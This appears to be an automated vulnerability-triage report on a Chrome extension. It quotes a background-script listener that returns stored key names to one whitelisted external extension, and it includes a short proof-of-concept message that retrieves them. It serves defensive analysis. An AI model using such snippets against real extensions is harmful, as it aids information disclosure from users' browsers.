# CoCo Analysis: ajaboiophmaflodkmglfpngnmiijkkle

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 5 (all variants of the same vulnerability)

---

## Sink: storage_local_get_source -> sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ajaboiophmaflodkmglfpngnmiijkkle/opgen_generated_files/bg.js
Line 751: var storage_local_get_source = {'key': 'value'}; (CoCo framework placeholder)
Line 965: Actual extension code with onMessageExternal listener

**Code:**

```javascript
// Background script (bg.js) - Line 965
chrome['runtime']['onMessageExternal']['addListener']((w,x,y)=>{
  // Only allows external messages from specific extension ID
  if(x['id']!=='efmpofoemibeochefpdgajaaoliaehji')return;

  switch(w['m']){
    case'i-u':
      // Reads ALL storage data
      chrome['storage']['local']['get'](null,z=>{ // <- storage.get source
        const A=[];
        for(const B in z){
          // Filters out some keys but includes most data
          B!=='auth'&&B!=='cursorColor'&&B!=='smodal'&&
          B!=='toolbar'&&B!=='theme'&&B!=='ff'&&A['push'](B);
        }
        y({'pus':A}); // <- sends storage keys back to external extension (sendResponseExternal sink)
      });
      return;
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted extension

**Attack:**

```javascript
// From the whitelisted extension (efmpofoemibeochefpdgajaaoliaehji)
// Send message to vulnerable extension
chrome.runtime.sendMessage(
  'ajaboiophmaflodkmglfpngnmiijkkle',
  {'m': 'i-u'},
  (response) => {
    console.log('Leaked storage keys:', response.pus);
    // Attacker receives list of all storage keys except:
    // auth, cursorColor, smodal, toolbar, theme, ff
  }
);
```

**Impact:** Information disclosure vulnerability. While the manifest restricts external messages to one specific extension ID (efmpofoemibeochefpdgajaaoliaehji), per the analysis methodology, we ignore manifest.json restrictions. If that extension is compromised or malicious, it can read the list of storage keys from this extension. This reveals what data the extension stores, which could be used to plan further attacks or understand user behavior. The vulnerability leaks storage keys (though not the full values) for all stored data except a few filtered keys.
